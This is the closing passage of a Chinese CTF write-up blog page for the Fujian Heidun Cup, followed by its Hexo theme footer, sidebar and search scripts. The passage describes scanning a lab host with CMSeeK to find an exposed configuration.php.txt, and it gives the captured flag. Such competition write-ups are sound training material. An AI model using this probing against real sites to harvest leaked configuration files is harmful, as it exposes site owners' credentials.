+<h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><p><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">CMSeeK</a> 扫出配置文件 <a href="http://192.168.200.202//configuration.php.txt" target="_blank" rel="noopener">http://192.168.200.202//configuration.php.txt</a> </p>
+<p>底部有flag: <code>flag{0b58f603ff55c0c190502b44b4ffbf2c}</code>  </p>
+<p>此外一些没进一步利用上的信息和部分题目的附件放在<a href="https://github.com/findneo/ctfgodown/blob/master/20180916heidun/" target="_blank" rel="noopener">GiIthub</a> ，有兴趣可移步查看。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/180903-pwnhub-lhy/" rel="next" title="胖哈勃之 LHY">
+                <i class="fa fa-chevron-left"></i> 胖哈勃之 LHY
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/180929-picoctf/" rel="prev" title="picoCTF-2018 解题报告">
+                picoCTF-2018 解题报告 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露-代码审计"><span class="nav-number">1.</span> <span class="nav-text">信息泄露+代码审计</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#最好的语言"><span class="nav-number">2.</span> <span class="nav-text">最好的语言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#the-user-is-admin"><span class="nav-number">3.</span> <span class="nav-text">the user is admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ccgs"><span class="nav-number">4.</span> <span class="nav-text">ccgs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注入日志分析"><span class="nav-number">5.</span> <span class="nav-text">注入日志分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#brightstar"><span class="nav-number">6.</span> <span class="nav-text">brightstar</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这是啥呀"><span class="nav-number">7.</span> <span class="nav-text">这是啥呀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows逆向"><span class="nav-number">8.</span> <span class="nav-text">Windows逆向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverseme"><span class="nav-number">9.</span> <span class="nav-text">reverseme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下午"><span class="nav-number">10.</span> <span class="nav-text">下午</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/180920-heidunbei/';
+          this.page.identifier = '180920-heidunbei/';
+          this.page.title = '福建省黑盾杯解题报告';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
